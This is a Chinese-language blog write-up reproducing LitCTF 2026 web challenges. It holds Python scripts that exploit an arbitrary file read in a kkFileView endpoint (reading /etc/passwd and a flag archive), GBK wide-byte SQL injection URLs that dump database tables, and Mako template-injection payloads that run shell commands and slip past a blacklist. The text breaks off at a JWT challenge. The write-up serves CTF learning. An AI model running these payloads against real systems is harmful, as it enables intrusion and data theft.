---
title: LitCTF2026
subtitle: LitCTF 2026 Web 赛题复现
date: 2026-05-25 23:35:46
catalog: true
header-img: ""
tags: [web, 复现]
categories: [赛题]
layout: post
---

# 华辰企业服务运营平台
没思路，就`dirsearch`扫了一下，

![actuator-env](01.png)

访问喽，`/actuator/env`

![actuator-env](02.png)

# Northbridge Document Hub
## 任意文件读取
![actuator-env](03.png)

先查看源码看看有什么东西

```javascript
(function () {
  var bootstrap = {
    release: "2026.03.01-r12",
    region: "cn-sh2",
    auth: {
      mode: "legacy-fallback",
      // researcher:Research#2026
      seed: "cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2"
    },
    fileGateway: {
      path: "/kkfileview/getCorsFile",
      queryKey: "urlPath",
      node: "legacy-parse-02"
    }
  };

  window.NorthbridgePortal = {
    config: bootstrap,
    decodeLegacyCredential: function () {
      try {
        return atob(bootstrap.auth.seed);
      } catch (e) {
        return "";
      }
    }
  };

  var form = document.querySelector("form[data-auth='portal']");
  if (form) {
    form.addEventListener("submit", function () {
      form.classList.add("is-submitting");
    });
  }
})();
```

看到了一个注释行，一个`Base64`编码，应该是账号密码提示

```plain
// researcher:Research#2026
cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2    //解码：researcher:Research#2026
```

所以猜测：

**账号：**`researcher`  
**密码：**`Research#2026`

![actuator-env](04.png)
成功登陆



我知道为什么我当时一直访问不成功了，是因为我登录时的账号的`cookies`是不会一直跟随我的

所以以后遇到这种题目要写脚本，就差最后一步了，还是太菜了

```python
import base64
import requests

# ========== 配置区 ==========
TARGET_URL = "http://challenge.cyclens.tech:32304/kkfileview/getCorsFile"
FILE_PATH = "file:///etc/passwd"       # 要读取的文件路径
COOKIES = {
    "session": "你的cookie值",          # ← 替换为实际 cookie
    # 如有其他 cookie 字段，继续添加
}
# ============================

# 1. Base64 编码（UTF-8）
payload = base64.b64encode(FILE_PATH.encode("utf-8")).decode("ascii")
print(f"[*] Payload (Base64): {payload}")

# 2. 发起请求
url = f"{TARGET_URL}?urlPath={payload}"
try:
    resp = requests.get(url, cookies=COOKIES, timeout=10)
    print(f"[*] Status Code: {resp.status_code}")
    print("[*] Response Body:")
    print(resp.text)
except Exception as e:
    print(f"[!] Request failed: {e}")
```

```plain
PS D:\CODE> python -u "d:\CODE\test\test.py"
[*] Payload (Base64): ZmlsZTovLy9ldGMvcGFzc3dk
[*] Status Code: 200
[*] Response Body:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

成功回显 `/etc/passwd` 内容，说明这里存在任意文件读取。

[LitCTF2026wp-CSDN博客](https://blog.csdn.net/genhaosan_/article/details/161348476)

**漏洞原理**

后续将部署包拉下来反编译，恢复出了核心逻辑。KkPathResolver 的处理流程大致如下：

+ 对 urlPath 做 Base64 解码
+ 将反斜杠替换为正斜杠
+ 如果存在 `?`，截断查询字符串
+ 如果以 `file://` 开头，就去掉协议头
+ 转成 Path 并` normalize()`
+ 如果路径字符串里 不包含` /opt/kkfileview/cache/`，就把它拼到缓存根 `/opt/kkfileview/cache/parsed` 下面
+ 否则直接使用该路径

**问题在于：**

+ 接口允许 `file://`
+ 没有真正限制读取根目录
+ 只通过字符串 `contains("/opt/kkfileview/cache/")` 来判断是否属于缓存目录

**因此只要传：**

```plain
Base64("file:///任意本地文件")
```

就可以直接读取任意本地文件。

这就是本题的核心漏洞。



那就可以直接修改脚本了

```python
import base64
import requests

# ========== 配置区 ==========
TARGET_URL = "http://challenge.cyclens.tech:30243/kkfileview/getCorsFile"  # ⚠️ 确认30243是否仍能访问
FILE_PATH = "file:///usr/local/bin/docker-entrypoint.sh"
COOKIES = {"JSESSIONID": "<YOUR_SESSION_ID>"}  # 替换为你自己登录后的Cookie

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}
# ============================

# 1. Base64 编码
payload = base64.b64encode(FILE_PATH.encode("utf-8")).decode("ascii")
print(f"[*] Reading: {FILE_PATH}")
print(f"[*] Base64 payload: {payload}")

# 2. 发起请求
url = f"{TARGET_URL}?urlPath={payload}"
try:
    resp = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=10)
    print(f"[*] Status Code: {resp.status_code}")

    if resp.status_code == 200 and resp.text.strip():
        print("[*] Script content:")
        print("=" * 60)
        print(resp.text)
        print("=" * 60)

        # 快速搜索关键词（flag / archive / finance / python / cat）
        keywords = ["flag", "archive", "finance", "quarter", "generate", "cat", "python", "sh", ">>"]
        found = []
        for kw in keywords:
            if kw in resp.text.lower():
                found.append(kw)
        if found:
            print(f"[!] Keywords found: {found}")
    else:
        print("[!] Empty or error response.")
        print("Response preview:", repr(resp.text[:200]))

except Exception as e:
    print(f"[!] Request failed: {e}")
```

输出

```plain
PS D:\CODE> python -u "d:\CODE\test\test.py"
[*] Reading: file:///usr/local/bin/docker-entrypoint.sh
[*] Base64 payload: ZmlsZTovLy91c3IvbG9jYWwvYmluL2RvY2tlci1lbnRyeXBvaW50LnNo
[*] Status Code: 200
[*] Script content:
============================================================
#!/bin/sh
set -eu

# Pick dynamic flag from common CTF platforms.
if [ "${DASFLAG:-}" ]; then
    INSERT_FLAG="$DASFLAG"
    export DASFLAG="no_FLAG"
elif [ "${FLAG:-}" ]; then
    INSERT_FLAG="$FLAG"
    export FLAG="no_FLAG"
elif [ "${GZCTF_FLAG:-}" ]; then
    INSERT_FLAG="$GZCTF_FLAG"
    export GZCTF_FLAG="no_FLAG"
else
    INSERT_FLAG="flag{TEST_Dynamic_FLAG}"
fi

CACHE_DIR="/opt/kkfileview/cache/parsed"
ZIP_NAME="q1_finance_report_2026.zip"

mkdir -p "$CACHE_DIR"

# Rebuild challenge artifacts on each container start so the flag is dynamic.
printf '%s\n' \
  'cd /opt/kkfileview/bin' \
  './startup.sh --cache.dir=/opt/kkfileview/cache/parsed' \
  'java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true' \
  'cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip' \
  > /root/.bash_history

echo "$INSERT_FLAG" > /tmp/flag.txt
(
    cd /tmp
    rm -f "${CACHE_DIR}/${ZIP_NAME}"
    jar -cf "${CACHE_DIR}/${ZIP_NAME}" flag.txt
)
rm -f /tmp/flag.txt

exec "$@"

============================================================
[!] Keywords found: ['flag', 'finance', 'sh']
```

从 `docker-entrypoint.sh` 的内容可以看出，Flag 被动态写入了 `/tmp/flag.txt`，然后被打包进了 ZIP 文件，最后 `/tmp/flag.txt` 被删除了。

### 关键线索分析
1. Flag 写入：`echo "$INSERT_FLAG" > /tmp/flag.txt`
2. 打包路径：`jar -cf "${CACHE_DIR}/${ZIP_NAME}" flag.txt`
    - `CACHE_DIR` = `/opt/kkfileview/cache/parsed`
    - `ZIP_NAME` = `q1_finance_report_2026.zip`
3. 最终文件位置：`/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip`
4. 清理操作：`rm -f /tmp/flag.txt` （所以直接读 `/tmp/flag.txt` 肯定没了）

继续脚本

```python
import base64
import requests
import os

# ========== 配置区 ==========
TARGET_URL = "http://challenge.cyclens.tech:30243/kkfileview/getCorsFile"
FILE_PATH = "file:///opt/kkfileview/cache/parsed/q1_finance_report_2026.zip"  # 👈 目标ZIP

COOKIES = {"JSESSIONID": "<YOUR_SESSION_ID>"}  # 替换为你自己登录后的Cookie
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
# ============================

payload = base64.b64encode(FILE_PATH.encode()).decode()
print(f"[*] Downloading: {FILE_PATH}")

url = f"{TARGET_URL}?urlPath={payload}"
resp = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=15)

if resp.status_code == 200 and len(resp.content) > 100:
    zip_path = "q1_finance_report_2026.zip"
    with open(zip_path, "wb") as f:
        f.write(resp.content)
    print(f"[+] Saved to {zip_path} ({len(resp.content)} bytes)")
    print("[!] Now run: python -c \"import zipfile; z=zipfile.ZipFile('q1_finance_report_2026.zip'); print(z.read('flag.txt').decode())\"")
else:
    print(f"[!] Failed: Status={resp.status_code}, Size={len(resp.content)}")
    print("Preview:", repr(resp.text[:300]))
```

最后在终端执行以下命令即可提取 Flag：

```python
python -c "import zipfile; z=zipfile.ZipFile('q1_finance_report_2026.zip'); print(z.read('flag.txt').decode())"
```

![actuator-env](05.png)

# lit_ezsql
## GBK 宽字节绕过单引号
正常查询的话，表单会把参数提交到 `/query`

```http
GET /query?id=1
```

![actuator-env](06.png)

然后我们可以尝试加上`debug=1`

```http
GET /query?debug=1&id=1
```

页面会额外回显 SQL：

![actuator-env](07.png)

这说明输入点被放进了单引号里。

直接输入单引号测试：

```http
1'
```

![actuator-env](08.png)

说明服务端对单引号做了反斜杠转义，普通注入无法直接闭合。

利用 **GBK 宽字节**注入绕过

```http
GET /query?debug=1&id=-1%BF%27%20UNION%20SELECT%201,2,3,4,5%23
```

![actuator-env](09.png)

回显成功

**原理：**

+ 服务端先把单引号转义成 `\` + `'`
+ 发送 `%BF%27` 后，转义结果会变成 `%BF%5C%27`
+ 在 GBK 编码下，`%BF%5C` 会被解释成一个双字节字符
+ 后面的 `%27` 就重新变成了有效单引号，从而成功逃逸字符串


查库名：

```http
GET /query?id=-1%BF%27%20UNION%20SELECT%201,database(),3,4,5%23
```

查到`ezsql`

![actuator-env](10.png)

查表名：

```http
GET /query?id=-1%BF%27%20UNION%20SELECT%201,group_concat(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23
```

查到`flag_store`

![actuator-env](11.png)

查列名：

因为过滤了`flag`字符串，所以使用**十六进制绕过**

```http
GET /query?id=-1%BF%27%20UNION%20SELECT%201,group_concat(column_name),3,4,5%20FROM%20information_schema.columns%20WHERE%20table_name=0x666c61675f73746f7265%23
```

查到`flag`

![actuator-env](12.png)
查字段：

```http
GET /query?id=-1%BF%27%20UNION%20SELECT%201,flag,3,4,5%20FROM%20flag_store%23
```

![actuator-env](13.png)

# lit_ezssti
## Mako 模板注入
首页是一个表单，`POST /` ，提交参数 `tpl`，服务端会把渲染结果回显到页面里

### 测模板指纹

+ **Mako**：使用 `<% ... %>` 作为脚本块标记（如 `<% import os %>`）
+ **Jinja2**：使用 `{% ... %}` 作为逻辑控制标记（如 `{% if x %}`）
+ **Freemarker**：使用 `<#...>` 作为指令标记或 `${...}` 作为插值标记
+ **Thymeleaf**：使用 `th:*` 作为属性标记或 `[[...]]` 作为内联表达式标记

```http
tpl={{7*7}}
```

回显原样返回，不执行

```http
tpl={% for x in [1] %}OK{% endfor %}
```

返回`WAF`

继续测：

```http
tpl=<%
```

返回：

```plain
[渲染异常] SyntaxException: Expected: %> at line: 1 char: 1
```

这说明模板引擎不是` Jinja2`，而是` Mako`

测试 payload：

```http
tpl=<% __M_writer(str(49)) %>
```

成功回显：`49`

说明已经是**Mako 模板**代码执行

### 分析 WAF
当时手动测了一会，想想挺傻的，可以用 bp 做模糊测试

黑名单比较粗暴，实测会拦的内容包括：

+ `=`
+ `.`
+ `[`
+ `]`
+ `${`
+ 某些关键字直接命中时也会拦，比如 `flag`

但它只是做**字符串匹配**，所以可以用字符串拼接绕过。

例如：

```http
tpl=<% __M_writer('/fla'+'g') %>
```

不会被拦，且最终运行时仍然得到`/flag</font>`

### 读取 flag
先验证命令执行：

```http
tpl=<% __M_writer(next(iter(getattr(__import__('os'),'popen')('id')))) %>
```

回显：

```plain
uid=0(root) gid=0(root) groups=0(root)
```

说明命令执行成功

那就可以读`flag`了

payload：

```plain
tpl=<% __M_writer(next(getattr(getattr(__import__('builtins'),'open')('/fla'+'g'),'__iter__')())) %>
```

拿到 flag

# lit_reverse_my_web
## JWT
访问首页后可以看到这是一个登录系统，公开功能主要有：`/register`和`/login`

注册普通用户并登录后，首页会出现一个进入归档中心的入口，对应路径为：`/flag`

但普通用户访问 /flag 会返回：

```plain
403 Forbidden
您暂时无此资源的访问权限
```

这说明：

+ flag 在服务端。
+ `/flag` 需要更高权限。
